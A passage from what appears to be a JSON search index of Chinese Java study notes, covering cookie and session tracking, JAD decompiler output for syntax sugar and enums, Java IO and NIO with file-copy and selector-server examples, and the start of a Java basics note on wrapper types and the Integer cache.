Cookie(\u0026#34;name\u0026#34;,\u0026#34;value\u0026#34;); //创建Cookie c.setMaxAge(60*60*24); //设置最大时效，此处设置的最大时效为一天 response.addCookie(c); //把Cookie放入到HTTP响应中 从客户端读取Cookie\nString name =\u0026#34;name\u0026#34;; Cookie[]cookies =request.getCookies(); if(cookies !=null){ for(int i= 0;i\u0026lt;cookies.length;i++){ Cookie cookie =cookies[i]; if(name.equals(cookis.getName())) //something is here.  //you can get the value  cookie.getValue(); } } 优点: 数据可以持久保存，不需要服务器资源，简单，基于文本的Key-Value\n缺点: 大小受到限制，用户可以禁用Cookie功能，由于保存在本地，有一定的安全风险。\nURL 重写  在URL中添加用户会话的信息作为请求的参数，或者将唯一的会话ID添加到URL结尾以标识一个会话。\n优点： 在Cookie被禁用的时候依然可以使用\n缺点： 必须对网站的URL进行编码，所有页面必须动态生成，不能用预先记录下来的URL进行访问。\n3.隐藏的表单域\n\u0026lt;input type=\u0026#34;hidden\u0026#34; name =\u0026#34;session\u0026#34; value=\u0026#34;...\u0026#34;/\u0026gt; 优点： Cookie被禁时可以使用\n缺点： 所有页面必须是表单提交之后的结果。\nHttpSession  在所有会话跟踪技术中，HttpSession对象是最强大也是功能最多的。当一个用户第一次访问某个网站时会自动创建 HttpSession，每个用户可以访问他自己的HttpSession。可以通过HttpServletRequest对象的getSession方 法获得HttpSession，通过HttpSession的setAttribute方法可以将一个值放在HttpSession中，通过调用 HttpSession对象的getAttribute方法，同时传入属性名就可以获取保存在HttpSession中的对象。与上面三种方式不同的 是，HttpSession放在服务器的内存中，因此不要将过大的对象放在里面，即使目前的Servlet容器可以在内存将满时将HttpSession 中的对象移到其他存储设备中，但是这样势必影响性能。添加到HttpSession中的值可以是任意Java对象，这个对象最好实现了 Serializable接口，这样Servlet容器在必要的时候可以将其序列化到文件中，否则在序列化时就会出现异常。\nCookie和Session的的区别    Cookie 和 Session都是用来跟踪浏览器用户身份的会话方式，但是两者的应用场景不太一样。\nCookie 一般用来保存用户信息 比如①我们在 Cookie 中保存已经登录过得用户信息，下次访问网站的时候页面可以自动帮你登录的一些基本信息给填了；②一般的网站都会有保持登录也就是说下次你再访问网站的时候就不需要重新登录了，这是因为用户登录的时候我们可以存放了一个 Token 在 Cookie 中，下次登录的时候只需要根据 Token 值来查找用户即可(为了安全考虑，重新登录一般要将 Token 重写)；③登录一次网站后访问网站其他页面不需要重新登录。Session 的主要作用就是通过服务端记录用户的状态。 典型的场景是购物车，当你要添加商品到购物车的时候，系统不知道是哪个用户操作的，因为 HTTP 协议是无状态的。服务端给特定的用户创建特定的 Session 之后就可以标识这个用户并且跟踪这个用户了。\nCookie 数据保存在客户端(浏览器端)，Session 数据保存在服务器端。\nCookie 存储在客户端中，而Session存储在服务器上，相对来说 Session 安全性更高。如果使用 Cookie 的一些敏感信息不要写入 Cookie 中，最好能将 Cookie 信息加密然后使用到的时候再去服务器端解密。\n公众号    如果大家想要实时关注我更新的文章以及分享的干货的话，可以关注我的公众号。\n《Java面试突击》: 由本文档衍生的专为面试而生的《Java面试突击》V2.0 PDF 版本公众号后台回复 \u0026ldquo;Java面试突击\u0026rdquo; 即可免费领取！\nJava工程师必备学习资源: 一些Java工程师常用学习资源公众号后台回复关键字 “1” 即可免费无套路获取。\n"},{"id":210,"href":"/java/tips/JAD%E5%8F%8D%E7%BC%96%E8%AF%91tricks/","title":"JAD反编译tricks","parent":"tips","content":"jad反编译工具，已经不再更新，且只支持 JDK1.4，但并不影响其强大的功能。\n基本用法：jad xxx.class，会生成直接可读的 xxx.jad 文件。\n自动拆装箱    对于基本类型和包装类型之间的转换，通过 xxxValue()和 valueOf()两个方法完成自动拆装箱，使用 jad 进行反编译可以看到该过程：\npublic class Demo { public static void main(String[] args) { int x = new Integer(10); // 自动拆箱  Integer y = x; // 自动装箱  } } 反编译后结果：\npublic class Demo { public Demo(){} public static void main(String args[]) { int i = (new Integer(10)).intValue(); // intValue()拆箱  Integer integer = Integer.valueOf(i); // valueOf()装箱  } } foreach 语法糖    在遍历迭代时可以 foreach 语法糖，对于数组类型直接转换成 for 循环：\n// 原始代码 int[] arr = {1, 2, 3, 4, 5}; for(int item: arr) { System.out.println(item); } } // 反编译后代码 int ai[] = { 1, 2, 3, 4, 5 }; int ai1[] = ai; int i = ai1.length; // 转换成for循环 for(int j = 0; j \u0026lt; i; j++) { int k = ai1[j]; System.out.println(k); } 对于容器类的遍历会使用 iterator 进行迭代：\nimport java.io.PrintStream; import java.util.*; public class Demo { public Demo() {} public static void main(String args[]) { ArrayList arraylist = new ArrayList(); arraylist.add(Integer.valueOf(1)); arraylist.add(Integer.valueOf(2)); arraylist.add(Integer.valueOf(3)); Integer integer; // 使用的for循环+Iterator，类似于链表迭代：  // for (ListNode cur = head; cur != null; System.out.println(cur.val)){  // cur = cur.next;  // }  for(Iterator iterator = arraylist.iterator(); iterator.hasNext(); System.out.println(integer)) integer = (Integer)iterator.next(); } } Arrays.asList(T\u0026hellip;)    熟悉 Arrays.asList(T\u0026hellip;)用法的小伙伴都应该知道，asList()方法传入的参数不能是基本类型的数组，必须包装成包装类型再使用，否则对应生成的列表的大小永远是 1：\nimport java.util.*; public class Demo { public static void main(String[] args) { int[] arr1 = {1, 2, 3}; Integer[] arr2 = {1, 2, 3}; List lists1 = Arrays.asList(arr1); List lists2 = Arrays.asList(arr2); System.out.println(lists1.size()); // 1  System.out.println(lists2.size()); // 3  } } 从反编译结果来解释，为什么传入基本类型的数组后，返回的 List 大小是 1：\n// 反编译后文件 import java.io.PrintStream; import java.util.Arrays; import java.util.List; public class Demo { public Demo() {} public static void main(String args[]) { int ai[] = { 1, 2, 3 }; // 使用包装类型，全部元素由int包装为Integer  Integer ainteger[] = { Integer.valueOf(1), Integer.valueOf(2), Integer.valueOf(3) }; // 注意这里被反编译成二维数组，而且是一个1行三列的二维数组  // list.size()当然返回1  List list = Arrays.asList(new int[][] { ai }); List list1 = Arrays.asList(ainteger); System.out.println(list.size()); System.out.println(list1.size()); } } 从上面结果可以看到，传入基本类型的数组后，会被转换成一个二维数组，而且是**new int[1][arr.length]**这样的数组，调用 list.size()当然返回 1。\n注解    Java 中的类、接口、枚举、注解都可以看做是类类型。使用 jad 来看一下@interface 被转换成什么：\nimport java.lang.annotation.Retention; import java.lang.annotation.RetentionPolicy; @Retention(RetentionPolicy.RUNTIME) public @interface Foo{ String[] value(); boolean bar(); } 查看反编译代码可以看出：\n 自定义的注解类 Foo 被转换成接口 Foo，并且继承 Annotation 接口 原来自定义接口中的 value()和 bar()被转换成抽象方法  import java.lang.annotation.Annotation; public interface Foo extends Annotation { public abstract String[] value(); public abstract boolean bar(); } 注解通常和反射配合使用，而且既然自定义的注解最终被转换成接口，注解中的属性被转换成接口中的抽象方法，那么通过反射之后拿到接口实例，在通过接口实例自然能够调用对应的抽象方法：\nimport java.util.Arrays; @Foo(value={\u0026#34;sherman\u0026#34;, \u0026#34;decompiler\u0026#34;}, bar=true) public class Demo{ public static void main(String[] args) { Foo foo = Demo.class.getAnnotation(Foo.class); System.out.println(Arrays.toString(foo.value())); // [sherman, decompiler]  System.out.println(foo.bar()); // true  } } 枚举    通过 jad 反编译可以很好地理解枚举类。\n空枚举    先定义一个空的枚举类：\npublic enum DummyEnum { } 使用 jad 反编译查看结果：\n 自定义枚举类被转换成 final 类，并且继承 Enum 提供了两个参数（name，odinal）的私有构造器，并且调用了父类的构造器。注意即使没有提供任何参数，也会有该构造器，其中 name 就是枚举实例的名称，odinal 是枚举实例的索引号 初始化了一个 private static final 自定义类型的空数组 $VALUES 提供了两个 public static 方法：  values()方法通过 clone()方法返回内部$VALUES 的浅拷贝。这个方法结合私有构造器可以完美实现单例模式，想一想 values()方法是不是和单例模式中 getInstance()方法功能类似 valueOf(String s)：调用父类 Enum 的 valueOf 方法并强转返回    public final class DummyEnum extends Enum { // 功能和单例模式的getInstance()方法相同  public static DummyEnum[] values() { return (DummyEnum[])$VALUES.clone(); } // 调用父类的valueOf方法，并强转返回  public static DummyEnum valueOf(String s) { return (DummyEnum)Enum.valueOf(DummyEnum, s); } // 默认提供一个私有的两个参数的构造器，并调用父类Enum的构造器  private DummyEnum(String s, int i) { super(s, i); } // 初始化一个private static final的本类空数组  private static final DummyEnum $VALUES[] = new DummyEnum[0]; } 包含抽象方法的枚举    枚举类中也可以包含抽象方法，但是必须定义枚举实例并且立即重写抽象方法，就像下面这样：\npublic enum DummyEnum { DUMMY1 { public void dummyMethod() { System.out.println(\u0026#34;[1]: implements abstract method in enum class\u0026#34;); } }, DUMMY2 { public void dummyMethod() { System.out.println(\u0026#34;[2]: implements abstract method in enum class\u0026#34;); } }; abstract void dummyMethod(); } 再来反编译看看有哪些变化：\n 原来 final class 变成了 abstract class：这很好理解，有抽象方法的类自然是抽象类 多了两个 public static final 的成员 DUMMY1、DUMMY2，这两个实例的初始化过程被放到了 static 代码块中，并且实例过程中直接重写了抽象方法，类似于匿名内部类的形式。 数组 $VALUES[] 初始化时放入枚举实例  还有其它变化么？\n在反编译后的 DummyEnum 类中，是存在抽象方法的，而枚举实例在静态代码块中初始化过程中重写了抽象方法。在 Java 中，抽象方法和抽象方法重写同时放在一个类中，只能通过内部类形式完成。因此上面第二点应该说成就是以内部类形式初始化。\n可以看一下 DummyEnum.class 存放的位置，应该多了两个文件：\n DummyEnum$1.class DummyEnum$2.class  Java 中.class 文件出现 $ 符号表示有内部类存在，就像OutClass$InnerClass，这两个文件出现也应证了上面的匿名内部类初始化的说法。\nimport java.io.PrintStream; public abstract class DummyEnum extends Enum { public static DummyEnum[] values() { return (DummyEnum[])$VALUES.clone(); } public static DummyEnum valueOf(String s) { return (DummyEnum)Enum.valueOf(DummyEnum, s); } private DummyEnum(String s, int i) { super(s, i); } // 抽象方法  abstract void dummyMethod(); // 两个pubic static final实例  public static final DummyEnum DUMMY1; public static final DummyEnum DUMMY2; private static final DummyEnum $VALUES[]; // static代码块进行初始化  static { DUMMY1 = new DummyEnum(\u0026#34;DUMMY1\u0026#34;, 0) { public void dummyMethod() { System.out.println(\u0026#34;[1]: implements abstract method in enum class\u0026#34;); } } ; DUMMY2 = new DummyEnum(\u0026#34;DUMMY2\u0026#34;, 1) { public void dummyMethod() { System.out.println(\u0026#34;[2]: implements abstract method in enum class\u0026#34;); } } ; // 对本类数组进行初始化  $VALUES = (new DummyEnum[] { DUMMY1, DUMMY2 }); } } 正常的枚举类    实际开发中，枚举类通常的形式是有两个参数（int code，Sring msg）的构造器，可以作为状态码进行返回。Enum 类实际上也是提供了包含两个参数且是 protected 的构造器，这里为了避免歧义，将枚举类的构造器设置为三个，使用 jad 反编译：\n最大的变化是：现在的 private 构造器从 2 个参数变成 5 个，而且在内部仍然将前两个参数通过 super 传递给父类，剩余的三个参数才是真正自己提供的参数。可以想象，如果自定义的枚举类只提供了一个参数，最终生成底层代码中 private 构造器应该有三个参数，前两个依然通过 super 传递给父类。\npublic final class CustomEnum extends Enum { public static CustomEnum[] values() { return (CustomEnum[])$VALUES.clone(); } public static CustomEnum valueOf(String s) { return (CustomEnum)Enum.valueOf(CustomEnum, s); } private CustomEnum(String s, int i, int j, String s1, Object obj) { super(s, i); code = j; msg = s1; data = obj; } public static final CustomEnum FIRST; public static final CustomEnum SECOND; public static final CustomEnum THIRD; private int code; private String msg; private Object data; private static final CustomEnum $VALUES[]; static { FIRST = new CustomEnum(\u0026#34;FIRST\u0026#34;, 0, 10010, \u0026#34;first\u0026#34;, Long.valueOf(100L)); SECOND = new CustomEnum(\u0026#34;SECOND\u0026#34;, 1, 10020, \u0026#34;second\u0026#34;, \u0026#34;Foo\u0026#34;); THIRD = new CustomEnum(\u0026#34;THIRD\u0026#34;, 2, 10030, \u0026#34;third\u0026#34;, new Object()); $VALUES = (new CustomEnum[] { FIRST, SECOND, THIRD }); } } "},{"id":211,"href":"/%E7%AC%94%E8%AE%B0/JavaJava-IO/","title":"Java IO","parent":"笔记","content":"Java IO     Java IO  一、概览 二、磁盘操作 三、字节操作  实现文件复制 装饰者模式   四、字符操作  编码与解码 String 的编码方式 Reader 与 Writer 实现逐行输出文本文件的内容   五、对象操作  序列化 Serializable transient   六、网络操作  InetAddress URL Sockets Datagram   七、NIO  流与块 通道与缓冲区 缓冲区状态变量 文件 NIO 实例 选择器 套接字 NIO 实例 内存映射文件 对比   八、参考资料    一、概览    Java 的 I/O 大概可以分成以下几类：\n 磁盘操作：File 字节操作：InputStream 和 OutputStream 字符操作：Reader 和 Writer 对象操作：Serializable 网络操作：Socket 新的输入/输出：NIO  二、磁盘操作    File 类可以用于表示文件和目录的信息，但是它不表示文件的内容。\n递归地列出一个目录下所有文件：\npublic static void listAllFiles(File dir) { if (dir == null || !dir.exists()) { return; } if (dir.isFile()) { System.out.println(dir.getName()); return; } for (File file : dir.listFiles()) { listAllFiles(file); } } 从 Java7 开始，可以使用 Paths 和 Files 代替 File。\n三、字节操作    实现文件复制    public static void copyFile(String src, String dist) throws IOException { FileInputStream in = new FileInputStream(src); FileOutputStream out = new FileOutputStream(dist); byte[] buffer = new byte[20 * 1024]; int cnt; // read() 最多读取 buffer.length 个字节  // 返回的是实际读取的个数  // 返回 -1 的时候表示读到 eof，即文件尾  while ((cnt = in.read(buffer, 0, buffer.length)) != -1) { out.write(buffer, 0, cnt); } in.close(); out.close(); } 装饰者模式    Java I/O 使用了装饰者模式来实现。以 InputStream 为例，\n InputStream 是抽象组件； FileInputStream 是 InputStream 的子类，属于具体组件，提供了字节流的输入操作； FilterInputStream 属于抽象装饰者，装饰者用于装饰组件，为组件提供额外的功能。例如 BufferedInputStream 为 FileInputStream 提供缓存的功能。  \n实例化一个具有缓存功能的字节流对象时，只需要在 FileInputStream 对象上再套一层 BufferedInputStream 对象即可。\nFileInputStream fileInputStream = new FileInputStream(filePath); BufferedInputStream bufferedInputStream = new BufferedInputStream(fileInputStream); DataInputStream 装饰者提供了对更多数据类型进行输入的操作，比如 int、double 等基本类型。\n四、字符操作    编码与解码    编码就是把字符转换为字节，而解码是把字节重新组合成字符。\n如果编码和解码过程使用不同的编码方式那么就出现了乱码。\n GBK 编码中，中文字符占 2 个字节，英文字符占 1 个字节； UTF-8 编码中，中文字符占 3 个字节，英文字符占 1 个字节； UTF-16be 编码中，中文字符和英文字符都占 2 个字节。  UTF-16be 中的 be 指的是 Big Endian，也就是大端。相应地也有 UTF-16le，le 指的是 Little Endian，也就是小端。\nJava 的内存编码使用双字节编码 UTF-16be，这不是指 Java 只支持这一种编码方式，而是说 char 这种类型使用 UTF-16be 进行编码。char 类型占 16 位，也就是两个字节，Java 使用这种双字节编码是为了让一个中文或者一个英文都能使用一个 char 来存储。\nString 的编码方式    String 可以看成一个字符序列，可以指定一个编码方式将它编码为字节序列，也可以指定一个编码方式将一个字节序列解码为 String。\nString str1 = \u0026#34;中文\u0026#34;; byte[] bytes = str1.getBytes(\u0026#34;UTF-8\u0026#34;); String str2 = new String(bytes, \u0026#34;UTF-8\u0026#34;); System.out.println(str2); 在调用无参数 getBytes() 方法时，默认的编码方式不是 UTF-16be。双字节编码的好处是可以使用一个 char 存储中文和英文，而将 String 转为 bytes[] 字节数组就不再需要这个好处，因此也就不再需要双字节编码。getBytes() 的默认编码方式与平台有关，一般为 UTF-8。\nbyte[] bytes = str1.getBytes(); Reader 与 Writer    不管是磁盘还是网络传输，最小的存储单元都是字节，而不是字符。但是在程序中操作的通常是字符形式的数据，因此需要提供对字符进行操作的方法。\n InputStreamReader 实现从字节流解码成字符流； OutputStreamWriter 实现字符流编码成为字节流。  实现逐行输出文本文件的内容    public static void readFileContent(String filePath) throws IOException { FileReader fileReader = new FileReader(filePath); BufferedReader bufferedReader = new BufferedReader(fileReader); String line; while ((line = bufferedReader.readLine()) != null) { System.out.println(line); } // 装饰者模式使得 BufferedReader 组合了一个 Reader 对象  // 在调用 BufferedReader 的 close() 方法时会去调用 Reader 的 close() 方法  // 因此只要一个 close() 调用即可  bufferedReader.close(); } 五、对象操作    序列化    序列化就是将一个对象转换成字节序列，方便存储和传输。\n 序列化：ObjectOutputStream.writeObject() 反序列化：ObjectInputStream.readObject()  不会对静态变量进行序列化，因为序列化只是保存对象的状态，静态变量属于类的状态。\nSerializable    序列化的类需要实现 Serializable 接口，它只是一个标准，没有任何方法需要实现，但是如果不去实现它的话而进行序列化，会抛出异常。\npublic static void main(String[] args) throws IOException, ClassNotFoundException { A a1 = new A(123, \u0026#34;abc\u0026#34;); String objectFile = \u0026#34;file/a1\u0026#34;; ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(objectFile)); objectOutputStream.writeObject(a1); objectOutputStream.close(); ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(objectFile)); A a2 = (A) objectInputStream.readObject(); objectInputStream.close(); System.out.println(a2); } private static class A implements Serializable { private int x; private String y; A(int x, String y) { this.x = x; this.y = y; } @Override public String toString() { return \u0026#34;x = \u0026#34; + x + \u0026#34; \u0026#34; + \u0026#34;y = \u0026#34; + y; } } transient    transient 关键字可以使一些属性不会被序列化。\nArrayList 中存储数据的数组 elementData 是用 transient 修饰的，因为这个数组是动态扩展的，并不是所有的空间都被使用，因此就不需要所有的内容都被序列化。通过重写序列化和反序列化方法，使得可以只序列化数组中有内容的那部分数据。\nprivate transient Object[] elementData; 六、网络操作    Java 中的网络支持：\n InetAddress：用于表示网络上的硬件资源，即 IP 地址； URL：统一资源定位符； Sockets：使用 TCP 协议实现网络通信； Datagram：使用 UDP 协议实现网络通信。  InetAddress    没有公有的构造函数，只能通过静态方法来创建实例。\nInetAddress.getByName(String host); InetAddress.getByAddress(byte[] address); URL    可以直接从 URL 中读取字节流数据。\npublic static void main(String[] args) throws IOException { URL url = new URL(\u0026#34;http://www.baidu.com\u0026#34;); /* 字节流 */ InputStream is = url.openStream(); /* 字符流 */ InputStreamReader isr = new InputStreamReader(is, \u0026#34;utf-8\u0026#34;); /* 提供缓存功能 */ BufferedReader br = new BufferedReader(isr); String line; while ((line = br.readLine()) != null) { System.out.println(line); } br.close(); } Sockets     ServerSocket：服务器端类 Socket：客户端类 服务器和客户端通过 InputStream 和 OutputStream 进行输入输出。  \nDatagram     DatagramSocket：通信类 DatagramPacket：数据包类  七、NIO    新的输入/输出 (NIO) 库是在 JDK 1.4 中引入的，弥补了原来的 I/O 的不足，提供了高速的、面向块的 I/O。\n流与块    I/O 与 NIO 最重要的区别是数据打包和传输的方式，I/O 以流的方式处理数据，而 NIO 以块的方式处理数据。\n面向流的 I/O 一次处理一个字节数据：一个输入流产生一个字节数据，一个输出流消费一个字节数据。为流式数据创建过滤器非常容易，链接几个过滤器，以便每个过滤器只负责复杂处理机制的一部分。不利的一面是，面向流的 I/O 通常相当慢。\n面向块的 I/O 一次处理一个数据块，按块处理数据比按流处理数据要快得多。但是面向块的 I/O 缺少一些面向流的 I/O 所具有的优雅性和简单性。\nI/O 包和 NIO 已经很好地集成了，java.io.* 已经以 NIO 为基础重新实现了，所以现在它可以利用 NIO 的一些特性。例如，java.io.* 包中的一些类包含以块的形式读写数据的方法，这使得即使在面向流的系统中，处理速度也会更快。\n通道与缓冲区    1. 通道    通道 Channel 是对原 I/O 包中的流的模拟，可以通过它读取和写入数据。\n通道与流的不同之处在于，流只能在一个方向上移动(一个流必须是 InputStream 或者 OutputStream 的子类)，而通道是双向的，可以用于读、写或者同时用于读写。\n通道包括以下类型：\n FileChannel：从文件中读写数据； DatagramChannel：通过 UDP 读写网络中数据； SocketChannel：通过 TCP 读写网络中数据； ServerSocketChannel：可以监听新进来的 TCP 连接，对每一个新进来的连接都会创建一个 SocketChannel。  2. 缓冲区    发送给一个通道的所有数据都必须首先放到缓冲区中，同样地，从通道中读取的任何数据都要先读到缓冲区中。也就是说，不会直接对通道进行读写数据，而是要先经过缓冲区。\n缓冲区实质上是一个数组，但它不仅仅是一个数组。缓冲区提供了对数据的结构化访问，而且还可以跟踪系统的读/写进程。\n缓冲区包括以下类型：\n ByteBuffer CharBuffer ShortBuffer IntBuffer LongBuffer FloatBuffer DoubleBuffer  缓冲区状态变量     capacity：最大容量； position：当前已经读写的字节数； limit：还可以读写的字节数。  状态变量的改变过程举例：\n① 新建一个大小为 8 个字节的缓冲区，此时 position 为 0，而 limit = capacity = 8。capacity 变量不会改变，下面的讨论会忽略它。\n\n② 从输入通道中读取 5 个字节数据写入缓冲区中，此时 position 为 5，limit 保持不变。\n\n③ 在将缓冲区的数据写到输出通道之前，需要先调用 flip() 方法，这个方法将 limit 设置为当前 position，并将 position 设置为 0。\n\n④ 从缓冲区中取 4 个字节到输出缓冲中，此时 position 设为 4。\n\n⑤ 最后需要调用 clear() 方法来清空缓冲区，此时 position 和 limit 都被设置为最初位置。\n\n文件 NIO 实例    以下展示了使用 NIO 快速复制文件的实例：\npublic static void fastCopy(String src, String dist) throws IOException { /* 获得源文件的输入字节流 */ FileInputStream fin = new FileInputStream(src); /* 获取输入字节流的文件通道 */ FileChannel fcin = fin.getChannel(); /* 获取目标文件的输出字节流 */ FileOutputStream fout = new FileOutputStream(dist); /* 获取输出字节流的文件通道 */ FileChannel fcout = fout.getChannel(); /* 为缓冲区分配 1024 个字节 */ ByteBuffer buffer = ByteBuffer.allocateDirect(1024); while (true) { /* 从输入通道中读取数据到缓冲区中 */ int r = fcin.read(buffer); /* read() 返回 -1 表示 EOF */ if (r == -1) { break; } /* 切换读写 */ buffer.flip(); /* 把缓冲区的内容写入输出文件中 */ fcout.write(buffer); /* 清空缓冲区 */ buffer.clear(); } } 选择器    NIO 常常被叫做非阻塞 IO，主要是因为 NIO 在网络通信中的非阻塞特性被广泛使用。\nNIO 实现了 IO 多路复用中的 Reactor 模型，一个线程 Thread 使用一个选择器 Selector 通过轮询的方式去监听多个通道 Channel 上的事件，从而让一个线程就可以处理多个事件。\n通过配置监听的通道 Channel 为非阻塞，那么当 Channel 上的 IO 事件还未到达时，就不会进入阻塞状态一直等待，而是继续轮询其它 Channel，找到 IO 事件已经到达的 Channel 执行。\n因为创建和切换线程的开销很大，因此使用一个线程来处理多个事件而不是一个线程处理一个事件，对于 IO 密集型的应用具有很好地性能。\n应该注意的是，只有套接字 Channel 才能配置为非阻塞，而 FileChannel 不能，为 FileChannel 配置非阻塞也没有意义。\n\n1. 创建选择器    Selector selector = Selector.open(); 2. 将通道注册到选择器上    ServerSocketChannel ssChannel = ServerSocketChannel.open(); ssChannel.configureBlocking(false); ssChannel.register(selector, SelectionKey.OP_ACCEPT); 通道必须配置为非阻塞模式，否则使用选择器就没有任何意义了，因为如果通道在某个事件上被阻塞，那么服务器就不能响应其它事件，必须等待这个事件处理完毕才能去处理其它事件，显然这和选择器的作用背道而驰。\n在将通道注册到选择器上时，还需要指定要注册的具体事件，主要有以下几类：\n SelectionKey.OP_CONNECT SelectionKey.OP_ACCEPT SelectionKey.OP_READ SelectionKey.OP_WRITE  它们在 SelectionKey 的定义如下：\npublic static final int OP_READ = 1 \u0026lt;\u0026lt; 0; public static final int OP_WRITE = 1 \u0026lt;\u0026lt; 2; public static final int OP_CONNECT = 1 \u0026lt;\u0026lt; 3; public static final int OP_ACCEPT = 1 \u0026lt;\u0026lt; 4; 可以看出每个事件可以被当成一个位域，从而组成事件集整数。例如：\nint interestSet = SelectionKey.OP_READ | SelectionKey.OP_WRITE; 3. 监听事件    int num = selector.select(); 使用 select() 来监听到达的事件，它会一直阻塞直到有至少一个事件到达。\n4. 获取到达的事件    Set\u0026lt;SelectionKey\u0026gt; keys = selector.selectedKeys(); Iterator\u0026lt;SelectionKey\u0026gt; keyIterator = keys.iterator(); while (keyIterator.hasNext()) { SelectionKey key = keyIterator.next(); if (key.isAcceptable()) { // ...  } else if (key.isReadable()) { // ...  } keyIterator.remove(); } 5. 事件循环    因为一次 select() 调用不能处理完所有的事件，并且服务器端有可能需要一直监听事件，因此服务器端处理事件的代码一般会放在一个死循环内。\nwhile (true) { int num = selector.select(); Set\u0026lt;SelectionKey\u0026gt; keys = selector.selectedKeys(); Iterator\u0026lt;SelectionKey\u0026gt; keyIterator = keys.iterator(); while (keyIterator.hasNext()) { SelectionKey key = keyIterator.next(); if (key.isAcceptable()) { // ...  } else if (key.isReadable()) { // ...  } keyIterator.remove(); } } 套接字 NIO 实例    public class NIOServer { public static void main(String[] args) throws IOException { Selector selector = Selector.open(); ServerSocketChannel ssChannel = ServerSocketChannel.open(); ssChannel.configureBlocking(false); ssChannel.register(selector, SelectionKey.OP_ACCEPT); ServerSocket serverSocket = ssChannel.socket(); InetSocketAddress address = new InetSocketAddress(\u0026#34;127.0.0.1\u0026#34;, 8888); serverSocket.bind(address); while (true) { selector.select(); Set\u0026lt;SelectionKey\u0026gt; keys = selector.selectedKeys(); Iterator\u0026lt;SelectionKey\u0026gt; keyIterator = keys.iterator(); while (keyIterator.hasNext()) { SelectionKey key = keyIterator.next(); if (key.isAcceptable()) { ServerSocketChannel ssChannel1 = (ServerSocketChannel) key.channel(); // 服务器会为每个新连接创建一个 SocketChannel  SocketChannel sChannel = ssChannel1.accept(); sChannel.configureBlocking(false); // 这个新连接主要用于从客户端读取数据  sChannel.register(selector, SelectionKey.OP_READ); } else if (key.isReadable()) { SocketChannel sChannel = (SocketChannel) key.channel(); System.out.println(readDataFromSocketChannel(sChannel)); sChannel.close(); } keyIterator.remove(); } } } private static String readDataFromSocketChannel(SocketChannel sChannel) throws IOException { ByteBuffer buffer = ByteBuffer.allocate(1024); StringBuilder data = new StringBuilder(); while (true) { buffer.clear(); int n = sChannel.read(buffer); if (n == -1) { break; } buffer.flip(); int limit = buffer.limit(); char[] dst = new char[limit]; for (int i = 0; i \u0026lt; limit; i++) { dst[i] = (char) buffer.get(i); } data.append(dst); buffer.clear(); } return data.toString(); } } public class NIOClient { public static void main(String[] args) throws IOException { Socket socket = new Socket(\u0026#34;127.0.0.1\u0026#34;, 8888); OutputStream out = socket.getOutputStream(); String s = \u0026#34;hello world\u0026#34;; out.write(s.getBytes()); out.close(); } } 内存映射文件    内存映射文件 I/O 是一种读和写文件数据的方法，它可以比常规的基于流或者基于通道的 I/O 快得多。\n向内存映射文件写入可能是危险的，只是改变数组的单个元素这样的简单操作，就可能会直接修改磁盘上的文件。修改数据与将数据保存到磁盘是没有分开的。\n下面代码行将文件的前 1024 个字节映射到内存中，map() 方法返回一个 MappedByteBuffer，它是 ByteBuffer 的子类。因此，可以像使用其他任何 ByteBuffer 一样使用新映射的缓冲区，操作系统会在需要时负责执行映射。\nMappedByteBuffer mbb = fc.map(FileChannel.MapMode.READ_WRITE, 0, 1024); 对比    NIO 与普通 I/O 的区别主要有以下两点：\n NIO 是非阻塞的； NIO 面向块，I/O 面向流。  八、参考资料     Eckel B, 埃克尔, 昊鹏, 等. Java 编程思想 [M]. 机械工业出版社, 2002. IBM: NIO 入门 Java NIO Tutorial Java NIO 浅析 IBM: 深入分析 Java I/O 的工作机制 IBM: 深入分析 Java 中的中文编码问题 IBM: Java 序列化的高级认识 NIO 与传统 IO 的区别 Decorator Design Pattern Socket Multicast  "},{"id":212,"href":"/%E7%AC%94%E8%AE%B0/JavaJava-%E5%9F%BA%E7%A1%80/","title":"Java 基础","parent":"笔记","content":"Java 基础     Java 基础  一、数据类型  基本类型 包装类型 缓存池   二、String  概览 不可变的好处 String, StringBuffer and StringBuilder\t String Pool new String(\u0026ldquo;abc\u0026rdquo;)   三、运算  参数传递 float 与 double 隐式类型转换 switch   四、关键字  final static   五、Object 通用方法  概览 equals() hashCode() toString() clone()   六、继承  访问权限 抽象类与接口 super 重写与重载   七、反射 八、异常 九、泛型 十、注解 十一、特性  Java 各版本的新特性 Java 与 C++ 的区别 JRE or JDK   参考资料    一、数据类型    基本类型     byte/8 char/16 short/16 int/32 float/32 long/64 double/64 boolean/~  boolean 只有两个值：true、false，可以使用 1 bit 来存储，但是具体大小没有明确规定。JVM 会在编译时期将 boolean 类型的数据转换为 int，使用 1 来表示 true，0 表示 false。JVM 支持 boolean 数组，但是是通过读写 byte 数组来实现的。\n Primitive Data Types The Java® Virtual Machine Specification  包装类型    基本类型都有对应的包装类型，基本类型与其对应的包装类型之间的赋值使用自动装箱与拆箱完成。\nInteger x = 2; // 装箱 调用了 Integer.valueOf(2) int y = x; // 拆箱 调用了 X.intValue()  Autoboxing and Unboxing  缓存池    new Integer(123) 与 Integer.valueOf(123) 的区别在于：\n new Integer(123) 每次都会新建一个对象； Integer.valueOf(123) 会使用缓存池中的对象，多次调用会取得同一个对象的引用。  Integer x = new Integer(123); Integer y = new Integer(123); System.out.println(x == y); // false Integer z = Integer.valueOf(123); Integer k = Integer.valueOf(123); System.out.println(z == k); // true valueOf() 方法的实现比较简单，就是先判断值是否在缓存池中，如果在的话就直接返回缓存池的内容。\npublic static Integer valueOf(int i) { if (i \u0026gt;= IntegerCache.low \u0026amp;\u0026amp; i \u0026lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i); } 在 Java 8 中，Integer 缓存池的大小默认为 -128~127。\nstatic final int low = -128; static final int high; static final Integer cache[]; static { // high value may be configured by property  int h = 127; String integerCacheHighPropValue = sun.misc.VM.getSavedProperty(\u0026#34;java.lang.Integer.IntegerCache.high\u0026#34;); if (integerCacheHighPropValue != null) { try { int i = parseInt(integerCacheHighPropValue); i = Math.max(i, 127); // Maximum array size is Integer.MAX_VALUE  h = Math.min(i, Integer.MAX_VALUE - (-low) -1); } catch( NumberFormatException nfe) { // If the property cannot be parsed into an int, ignore it.  } } high = h; cache = new Integer[(high - low) + 1]; int j = low; for(int k = 0; k \u0026lt; cache.length; k++) cache[k] = new Integer(j++); // range [-128, 127] must be interned (JLS7 5.1.7)  assert IntegerCache.high \u0026gt;= 127; } 编译器会在自动装箱过程调用 valueOf() 